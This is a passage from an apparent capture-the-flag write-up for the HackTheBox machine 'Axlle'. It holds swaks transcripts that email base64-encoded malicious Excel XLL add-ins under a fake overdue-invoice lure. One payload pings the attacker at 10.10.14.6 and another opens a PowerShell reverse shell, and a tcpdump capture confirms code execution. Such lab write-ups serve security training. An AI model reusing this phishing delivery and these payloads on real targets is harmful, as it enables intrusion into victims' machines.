 -> AcPMM8DD/yVHAwAAzMzMzMzMzMzMzMzMzMzMzMzMzMzMZmYPH4QAAAAAAP/gzMzMzMzMzMzMzMzM
 -> zMzMzMzMzMxmZg8fhAAAAAAA/yWKAwAAQFVIg+wgSIvqik1ASIPEIF3pbPv//8xAVUiD7CBIi+qK
 -> TSDoWvv//5BIg8QgXcPMQFVIg+wgSIvqSIPEIF3py/n//8xAVUiD7DBIi+pIiwGLEEiJTCQoiVQk
 -> IEyNDYjy//9Mi0Vwi1VoSItNYOgM+f//kEiDxDBdw8xAVUiL6kiLATPJgTgFAADAD5TBi8Fdw8wA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGLAAAAAAAACor
 -> AAAAAAAAFisAAAAAAABYKwAAAAAAAHQrAAAAAAAAkisAAAAAAABMLAAAAAAAADYsAAAAAAAAHCwA
 -> AAAAAABEKwAAAAAAAPArAAAAAAAA1isAAAAAAAC6KwAAAAAAAKYrAAAAAAAAAAAAAAAAAABuLAAA
 -> AAAAAAgqAAAAAAAA8CkAAAAAAAAoKgAAAAAAAAAAAAAAAAAA6ioAAAAAAADSKgAAAAAAALYqAAAA
 -> AAAAlCoAAAAAAAB6KgAAAAAAAGgqAAAAAAAAWioAAAAAAABOKgAAAAAAAEQqAAAAAAAAAAAAAAAA
 -> AAAYGwCAAQAAABgbAIABAAAAUB0AgAEAAABwHQCAAQAAAHAdAIABAAAAAAAAAAAAAAArHQCAAQAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkDAAgAEAAAAwMQCAAQAAAAAAAAAAAAAA////////////
 -> /////////2NtZC5leGUgL2MgcGluZyAtbiAxIDEwLjEwLjE0LjYAQAEAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAwAIABAAAAAAAAAAAAAAAAAAAAAAAAAPAgAIABAAAAACEAgAEAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAIAjAIABAAAAAAAAAAAAAAAAAAAAAAAAAPggAIABAAAACCEAgAEAAAAQIQCAAQAA
 -> ABghAIABAAAAICEAgAEAAAAAAAAAjoB8ZgAAAAACAAAAZAAAANwjAADcFwAAAAAAAI6AfGYAAAAA
 -> DAAAABQAAABAJAAAQBgAAAAAAACOgHxmAAAAAA0AAABYAgAAVCQAAFQYAAAAAAAAjoB8ZgAAAAAO
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgAAAACgAKAmCMAACwAAADEIwAAGAAAABsU
 -> AACXFAAArBQAADkWAABPFgAADxkAAAIaAAA0GgAATxwAAFQcAACeHAAAYBAAAIAMAAAkHQAABwAA
 -> AHYdAACSAAAAUlNEU00VyheE625Itj1uo9ln1JEBAAAAWjpcaGFja3RoZWJveFxheGxsZS0xMC4x
 -> MC4xMS4yMVxIZWxsb1dvcmxkWGxsXHg2NFxSZWxlYXNlXEhlbGxvV29ybGRYbGwucGRiAAAAAAAV
 -> AAAAFQAAAAMAAAASAAAAR0NUTAAQAABADQAALnRleHQkbW4AAAAAQB0AADYAAAAudGV4dCRtbiQw
 -> MAB2HQAAkgAAAC50ZXh0JHgAACAAAPAAAAAuaWRhdGEkNQAAAADwIAAAOAAAAC4wMGNmZwAAKCEA
 -> AAgAAAAuQ1JUJFhDQQAAAAAwIQAACAAAAC5DUlQkWENaAAAAADghAAAIAAAALkNSVCRYSUEAAAAA
 -> QCEAAAgAAAAuQ1JUJFhJWgAAAABIIQAACAAAAC5DUlQkWFBBAAAAAFAhAAAIAAAALkNSVCRYUFoA
 -> AAAAWCEAAAgAAAAuQ1JUJFhUQQAAAABgIQAAEAAAAC5DUlQkWFRaAAAAAHAhAAAQAgAALnJkYXRh
 -> AACAIwAAXAAAAC5yZGF0YSR2b2x0bWQAAADcIwAA1AIAAC5yZGF0YSR6enpkYmcAAACwJgAACAAA
 -> AC5ydGMkSUFBAAAAALgmAAAIAAAALnJ0YyRJWloAAAAAwCYAAAgAAAAucnRjJFRBQQAAAADIJgAA
 -> CAAAAC5ydGMkVFpaAAAAANAmAACQAQAALnhkYXRhAABgKAAAUAAAAC5lZGF0YQAAsCgAADwAAAAu
 -> aWRhdGEkMgAAAADsKAAAFAAAAC5pZGF0YSQzAAAAAAApAADwAAAALmlkYXRhJDQAAAAA8CkAAIgC
 -> AAAuaWRhdGEkNgAAAAAAMAAAgAAAAC5kYXRhAAAAgDAAAAAGAAAuYnNzAAAAAABAAACwAQAALnBk
 -> YXRhAAAAUAAAYAAAAC5yc3JjJDAxAAAAAGBQAACAAQAALnJzcmMkMDIAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQQBAARCAAABAAAAERUIABV0CQAVZAcAFTQGABUyEeDg
 -> HAAAAgAAAOgQAABXEQAAdh0AAAAAAAC6EQAAxREAAHYdAAAAAAAAAQYCAAYyAlARCgQACjQIAApS
 -> BnDgHAAABAAAAP8RAAAeEgAAjR0AAAAAAAD0EQAAMhIAAKYdAAAAAAAAOxIAAEYSAACNHQAAAAAA
 -> ADsSAABHEgAAph0AAAAAAAAJGgYAGjQPABpyFuAUcBNg4BwAAAEAAAB9EgAAYxMAALodAABjEwAA
 -> AQYCAAZSAlABDwYAD2QHAA80BgAPMgtwAQkBAAliAAABCAQACHIEcANgAjABBgIABjICMAENBAAN
 -> NAoADVIGUAkEAQAEIgAA4BwAAAEAAABnGAAA8RgAAPAdAADxGAAAAQIBAAJQAAABFAgAFGQIABRU
 -> BwAUNAYAFDIQcAEVBQAVNLoAFQG4AAZQAAABCgQACjQGAAoyBnABDwYAD2QGAA80BQAPEgtwAAAA
 -> AAEAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAD/////AAAAAJIoAAABAAAAAQAAAAEAAACIKAAA
 -> jCgAAJAoAAAQEAAApCgAAAAASGVsbG9Xb3JsZFhsbC54bGwAeGxBdXRvT3BlbgAAeCkAAAAAAAAA
 -> AAAAMioAAHggAACgKQAAAAAAAAAAAAD0KgAAoCAAAAApAAAAAAAAAAAAAGAsAAAAIAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAGLAAAAAAAACorAAAAAAAAFisAAAAAAABYKwAAAAAAAHQrAAAAAAAAkisA
 -> AAAAAABMLAAAAAAAADYsAAAAAAAAHCwAAAAAAABEKwAAAAAAAPArAAAAAAAA1isAAAAAAAC6KwAA
 -> AAAAAKYrAAAAAAAAAAAAAAAAAABuLAAAAAAAAAgqAAAAAAAA8CkAAAAAAAAoKgAAAAAAAAAAAAAA
 -> AAAA6ioAAAAAAADSKgAAAAAAALYqAAAAAAAAlCoAAAAAAAB6KgAAAAAAAGgqAAAAAAAAWioAAAAA
 -> AABOKgAAAAAAAEQqAAAAAAAAAAAAAAAAAAAIAF9fQ19zcGVjaWZpY19oYW5kbGVyAAAlAF9fc3Rk
 -> X3R5cGVfaW5mb19kZXN0cm95X2xpc3QAAD4AbWVtc2V0AABWQ1JVTlRJTUUxNDAuZGxsAABmAHN5
 -> c3RlbQAANgBfaW5pdHRlcm0ANwBfaW5pdHRlcm1fZQA/AF9zZWhfZmlsdGVyX2RsbAAYAF9jb25m
 -> aWd1cmVfbmFycm93X2FyZ3YAADMAX2luaXRpYWxpemVfbmFycm93X2Vudmlyb25tZW50AAA0AF9p
 -> bml0aWFsaXplX29uZXhpdF90YWJsZQAAIgBfZXhlY3V0ZV9vbmV4aXRfdGFibGUAFgBfY2V4aXQA
 -> AGFwaS1tcy13aW4tY3J0LXJ1bnRpbWUtbDEtMS0wLmRsbAABBVJ0bENhcHR1cmVDb250ZXh0AAkF
 -> UnRsTG9va3VwRnVuY3Rpb25FbnRyeQAAEAVSdGxWaXJ0dWFsVW53aW5kAADzBVVuaGFuZGxlZEV4
 -> Y2VwdGlvbkZpbHRlcgAAsAVTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAOwJHZXRDdXJyZW50
 -> UHJvY2VzcwDQBVRlcm1pbmF0ZVByb2Nlc3MAALIDSXNQcm9jZXNzb3JGZWF0dXJlUHJlc2VudAB7
 -> BFF1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyADwCR2V0Q3VycmVudFByb2Nlc3NJZABAAkdldEN1cnJl
 -> bnRUaHJlYWRJZAAAFANHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQCUA0luaXRpYWxpemVTTGlzdEhl
 -> YWQAqgNJc0RlYnVnZ2VyUHJlc2VudABLRVJORUwzMi5kbGwAADwAbWVtY3B5AAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADKi3y2ZKwAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADNXSDSZtT/////
 -> //8AAAAAAQAAAAIAAAAAAAgAAAAAAAAAAAIAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEBAAACsQAADQJgAAQBAAAF4Q
 -> AADYJgAAYBAAALAQAADQJgAAsBAAAMYRAADcJgAAyBEAAEgSAAAgJwAASBIAAHkTAAB0JwAAfBMA
 -> ALkTAACkJwAAvBMAAPATAADIJwAA8BMAAMIUAAC0JwAAxBQAADUVAAC8JwAAOBUAAOQVAADQJwAA
 -> EBYAACsWAADQJgAALBYAAGUWAADQJgAAaBYAAJwWAADQJgAAnBYAALEWAADQJgAAtBYAANwWAADQ
 -> JgAA3BYAAPEWAADQJgAA9BYAAFQXAAAEKAAAVBcAAIQXAADQJgAAhBcAAJgXAADQJgAAmBcAANIX
 -> AADQJgAA1BcAAF8YAADIJwAAYBgAAPgYAADcJwAA+BgAABwZAADIJwAAHBkAAEUZAADIJwAAWBkA
 -> AKAaAAAYKAAAoBoAANwaAAAoKAAA3BoAABgbAAAoKAAAHBsAAMgcAAA0KAAAUB0AAFIdAABIKAAA
 -> cB0AAHYdAABQKAAAdh0AAI0dAAAYJwAAjR0AAKYdAAAYJwAAph0AALodAAAYJwAAuh0AAPAdAACc
 -> JwAA8B0AAAgeAAD8JwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAGAAA
 -> ABgAAIAAAAAAAAAAAAAAAAAAAAEAAgAAADAAAIAAAAAAAAAAAAAAAAAAAAEACQQAAEgAAABgUAAA
 -> fQEAAAAAAAAAAAAAAAAAAAAAAAA8P3htbCB2ZXJzaW9uPScxLjAnIGVuY29kaW5nPSdVVEYtOCcg
 -> c3RhbmRhbG9uZT0neWVzJz8+DQo8YXNzZW1ibHkgeG1sbnM9J3VybjpzY2hlbWFzLW1pY3Jvc29m
 -> dC1jb206YXNtLnYxJyBtYW5pZmVzdFZlcnNpb249JzEuMCc+DQogIDx0cnVzdEluZm8geG1sbnM9
 -> InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICA8c2VjdXJpdHk+DQogICAg
 -> ICA8cmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVs
 -> IGxldmVsPSdhc0ludm9rZXInIHVpQWNjZXNzPSdmYWxzZScgLz4NCiAgICAgIDwvcmVxdWVzdGVk
 -> UHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+
 -> DQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAsAAAA8KD4oAChCKEQoSCh
 -> eKGAoRiiMKI4osCi2KLgouii8KL4ogAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ->
 -> ------=_MIME_BOUNDARY_000_1499947--
 ->
 ->
 -> .
<-  250 Queued (10.610 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.

```

A few seconds after the sending is complete, there is an ICMP packet at `tcpdump`:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:02:28.748746 IP 10.10.11.21 > 10.10.14.6: ICMP echo request, id 1, seq 5, length 40
17:02:28.748778 IP 10.10.14.6 > 10.10.11.21: ICMP echo reply, id 1, seq 5, length 40

```

That’s RCE.

### Shell

I’ll replace the `ping -n 1 10.10.14.6` with a PowerShell #3 (Base64) reverse shell from [revshells.com](https://www.revshells.com/):

![image-20240626170553828](/img/image-20240626170553828.png)

After building it in VS, I’ll go back to my Linux VM and move the result, and send it:

```

oxdf@hacky$ cp HelloWorldXll/x64/Release/HelloWorldXll.xll invoice-rev.xll
oxdf@hacky$ swaks --to accounts@axlle.htb --from 0xdf@axlle.htb --header "Subject: Invoice overdue!" --body "Please pay the attached invioce ASAP. It is past due." --attach invoice-rev.xll
*** DEPRECATION WARNING: Inferring a filename from the argument to --attach will be removed in the future.  Prefix filenames with '@' instead.
=== Trying axlle.htb:25...
=== Connected to axlle.htb.
<-  220 MAINFRAME ESMTP
 -> EHLO hacky
<-  250-MAINFRAME
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> MAIL FROM:<0xdf@axlle.htb>
<-  250 OK
 -> RCPT TO:<accounts@axlle.htb>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Wed, 26 Jun 2024 17:06:41 -0400
 -> To: accounts@axlle.htb
 -> From: 0xdf@axlle.htb
 -> Subject: Invoice overdue!
 -> Message-Id: <20240626170641.1500604@hacky>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_1500604"
 ->
 -> ------=_MIME_BOUNDARY_000_1500604
 -> Content-Type: text/plain
 ->
 -> Please pay the attached invioce ASAP. It is past due.
 -> ------=_MIME_BOUNDARY_000_1500604
 -> Content-Type: application/octet-stream; name="invoice-rev.xll"
 -> Content-Description: invoice-rev.xll
 -> Content-Disposition: attachment; filename="invoice-rev.xll"
 -> Content-Transfer-Encoding: BASE64
 ->
 -> TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAACAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
 -> ZGUuDQ0KJAAAAAAAAAAkPceUYFypx2BcqcdgXKnHaSQ6x2Jcqcdm3ajGY1ypx2bdrMZqXKnHZt2t
 -> xmhcqcdm3arGY1ypxxDdqMZiXKnHYFyox0NcqccN3aDGY1ypxw3dqcZhXKnHDd1Wx2FcqccN3avG
 -> YVypx1JpY2hgXKnHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUEUAAGSGBgC1gnxmAAAAAAAAAADw
 -> ACIgCwIOJgAQAAAAIAAAAAAAAHwTAAAAEAAAAAAAgAEAAAAAEAAAAAIAAAYAAAAAAAAABgAAAAAA
 -> AAAAgAAAAAQAAAAAAAACAGABAAAQAAAAAAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAA
 -> AOAtAABQAAAAMC4AAFAAAAAAYAAA4AEAAABQAACwAQAAAAAAAAAAAAAAcAAALAAAADAoAABwAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8CYAAEABAAAAAAAAAAAAAAAgAADwAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAALnRleHQAAAAIDgAAABAAAAAQAAAABAAAAAAAAAAAAAAAAAAAIAAAYC5y
 -> ZGF0YQAA+BEAAAAgAAAAEgAAABQAAAAAAAAAAAAAAAAAAEAAAEAuZGF0YQAAAIAGAAAAQAAAAAIA
 -> AAAmAAAAAAAAAAAAAAAAAABAAADALnBkYXRhAACwAQAAAFAAAAACAAAAKAAAAAAAAAAAAAAAAAAA
 -> QAAAQC5yc3JjAAAA4AEAAABgAAAAAgAAACoAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAACwAAAAA
 -> cAAAAAIAAAAsAAAAAAAAAAAAAAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALgB
 -> AAAAw8zMzMzMzMzMzMxIg+woSI0NhREAAP8VvxAAALgBAAAASIPEKMPMzMzMzMzMzMzMzGZmDx+E
 -> AAAAAABIOw25LwAAdRBIwcEQZvfB//91AcNIwckQ6ZIDAADMzEiD7CiF0nQ5g+oBdCiD6gF0FoP6
 -> AXQKuAEAAABIg8Qow+hWBgAA6wXoJwYAAA+2wEiDxCjDSYvQSIPEKOkPAAAATYXAD5XBSIPEKOkY
 -> AQAASIlcJAhIiXQkEEiJfCQgQVZIg+wgSIvyTIvxM8noxgYAAITAD4TIAAAA6E0FAACK2IhEJEBA
 -> twGDPTE1AAAAD4XFAAAAxwUhNQAAAQAAAOiYBQAAhMB0T+iTCQAA6NIEAADo+QQAAEiNFSIQAABI
 -> jQ0TEAAA6M4LAACFwHUp6DUFAACEwHQgSI0V8g8AAEiNDeMPAADoqAsAAMcFzDQAAAIAAABAMv+K
 -> y+iaBwAAQIT/dT/o4AcAAEiL2EiDOAB0JEiLyOjnBgAAhMB0GEyLxroCAAAASYvOSIsDTIsNbg8A
 -> AEH/0f8F5S4AALgBAAAA6wIzwEiLXCQwSIt0JDhIi3wkSEiDxCBBXsO5BwAAAOiUBwAAkMzMzEiJ
 -> XCQIV0iD7DBAivmLBaUuAACFwH8NM8BIi1wkQEiDxDBfw//IiQWMLgAA6DMEAACK2IhEJCCDPRo0
 -> AAACdTPoRwUAAOjiAwAA6MUIAACDJQI0AAAAisvo0wYAADPSQIrP6O0GAAAPttjoTQUAAIvD66a5
 -> BwAAAOgTBwAAkJDMSIvESIlYIEyJQBiJUBBIiUgIVldBVkiD7EBJi/CL+kyL8YXSdQ85FQwuAAB/
 -> BzPA6e4AAACNQv+D+AF3RUiLBeQOAABIhcB1CsdEJDABAAAA6xT/FV8OAACL2IlEJDCFwA+EsgAA
 -> AEyLxovXSYvO6KT9//+L2IlEJDCFwA+ElwAAAEyLxovXSYvO6Cn9//+L2IlEJDCD/wF1NoXAdTJM
 -> i8Yz0kmLzugN/f//SIX2D5XB6Mr+//9IiwVrDgAASIXAdA5Mi8Yz0kmLzv8V6A0AAIX/dAWD/wN1
 -> QEyLxovXSYvO6DL9//+L2IlEJDCFwHQpSIsFMQ4AAEiFwHUJjVgBiVwkMOsUTIvGi9dJi87/FaUN
 -> AACL2IlEJDDrBjPbiVwkMIvDSItcJHhIg8RAQV5fXsPMzMxIiVwkCEiJdCQQV0iD7CBJi/iL2kiL
 -> 8YP6AXUF6JsBAABMi8eL00iLzkiLXCQwSIt0JDhIg8QgX+mP/v//zMzMQFNIg+wgSIvZM8n/FVMM
 -> AABIi8v/FUIMAAD/FUwMAABIi8i6CQQAwEiDxCBbSP8leAwAAEiJTCQISIPsOLkXAAAA/xVcDAAA
 -> hcB0B7kCAAAAzSlIjQ0aLQAA6KkAAABIi0QkOEiJBQEuAABIjUQkOEiDwAhIiQWRLQAASIsF6i0A
 -> AEiJBVssAABIi0QkQEiJBV8tAADHBTUsAAAJBADAxwUvLAAAAQAAAMcFOSwAAAEAAAC4CAAAAEhr
 -> wABIjQ0xLAAASMcEAQIAAAC4CAAAAEhrwABIiw1pKwAASIlMBCC4CAAAAEhrwAFIiw2UKwAASIlM
 -> BCBIjQ3ADAAA6P/+//9Ig8Q4w8zMQFNWV0iD7EBIi9n/FTsLAABIi7P4AAAAM/9FM8BIjVQkYEiL
 -> zv8VGQsAAEiFwHQ5SINkJDgASI1MJGhIi1QkYEyLyEiJTCQwTIvGSI1MJHBIiUwkKDPJSIlcJCD/
 -> FSILAAD/x4P/AnyxSIPEQF9eW8PMzMxIiVwkGFVIi+xIg+wwSIsFtCoAAEi7MqLfLZkrAABIO8N1
 -> dEiDZRAASI1NEP8V1goAAEiLRRBIiUXw/xWICgAAi8BIMUXw/xXMCgAAi8BIjU0YSDFF8P8VxAoA
 -> AItFGEiNTfBIweAgSDNFGEgzRfBIM8FIuf///////wAASCPBSLkzot8tmSsAAEg7w0gPRMFIiQUx
 -> KgAASItcJFBI99BIiQViKgAASIPEMF3DSI0NFTAAAEj/JUYKAADMzEiNDQUwAADp5gYAAEiNBQkw
 -> AADDSI0FCTAAAMNIg+wo6Of///9Igwgk6Ob///9IgwgCSIPEKMPMSIPsKOiTBgAAhcB0IWVIiwQl
 -> MAAAAEiLSAjrBUg7yHQUM8DwSA+xDdAvAAB17jLASIPEKMOwAev3zMzMSIPsKOhXBgAAhcB0B+ii
 -> BAAA6xnof/n//4vI6HwGAACFwHQEMsDrB+h1BgAAsAFIg8Qow0iD7CgzyegtAQAAhMAPlcBIg8Qo
 -> w8zMzEiD7CjoZwYAAITAdQQywOsS6FoGAACEwHUH6FEGAADr7LABSIPEKMNIg+wo6D8GAADoOgYA
 -> ALABSIPEKMPMzMxIiVwkCEiJbCQQSIl0JBhXSIPsIEmL+UmL8IvaSIvp6LAFAACFwHUWg/sBdRFM
 -> i8Yz0kiLzUiLx/8VzgkAAEiLVCRYi0wkUEiLXCQwSItsJDhIi3QkQEiDxCBf6aoFAABIg+wo6GsF
 -> AACFwHQQSI0N0C4AAEiDxCjppQUAAOiyBQAAhcB1BeidBQAASIPEKMNIg+woM8nolQUAAEiDxCjp
 -> jAUAAEiD7CiFyXUHxgWJLgAAAehwAwAA6HMFAACEwHUEMsDrFOhmBQAAhMB1CTPJ6FsFAADr6rAB
 -> SIPEKMPMzEBTSIPsIIA9UC4AAACL2XVng/kBd2ro2QQAAIXAdCiF23UkSI0NOi4AAOgNBQAAhcB1
 -> EEiNDUIuAADo/QQAAIXAdC4ywOszZg9vBW0JAABIg8j/8w9/BQkuAABIiQUSLgAA8w9/BRIuAABI
 -> iQUbLgAAxgXlLQAAAbABSIPEIFvDuQUAAADo+gAAAMzMSIPsGEyLwbhNWgAAZjkFjef//3V4SGMN
 -> wOf//0iNFX3n//9IA8qBOVBFAAB1X7gLAgAAZjlBGHVUTCvCD7dRFEiDwhhIA9EPt0EGSI0MgEyN
 -> DMpIiRQkSTvRdBiLSgxMO8FyCotCCAPBTDvAcghIg8Io698z0kiF0nUEMsDrFIN6JAB9BDLA6wqw
 -> AesGMsDrAjLASIPEGMNAU0iD7CCK2ejDAwAAM9KFwHQLhNt1B0iHFRItAABIg8QgW8NAU0iD7CCA
 -> PQctAAAAitl0BITSdQzo7gMAAIrL6OcDAACwAUiDxCBbw8zMzEiNBSktAADDgyURLQAAAMNIiVwk
 -> CFVIjawkQPv//0iB7MAFAACL2bkXAAAA/xXmBgAAhcB0BIvLzSm5AwAAAOjE////M9JIjU3wQbjQ
 -> BAAA6E8DAABIjU3w/xVpBgAASIud6AAAAEiNldgEAABIi8tFM8D/FUcGAABIhcB0PEiDZCQ4AEiN
 -> jeAEAABIi5XYBAAATIvISIlMJDBMi8NIjY3oBAAASIlMJChIjU3wSIlMJCAzyf8VRgYAAEiLhcgE
 -> AABIjUwkUEiJhegAAAAz0kiNhcgEAABBuJgAAABIg8AISImFiAAAAOi4AgAASIuFyAQAAEiJRCRg
 -> x0QkUBUAAEDHRCRUAQAAAP8V2gUAAIvYM8lIjUQkUEiJRCRASI1F8EiJRCRI/xWtBQAASI1MJED/
 -> FZoFAACFwHUNg/sBdAiNSAPowf7//0iLnCTQBQAASIHEwAUAAF3DSIlcJAhXSIPsIEiNHYcRAABI
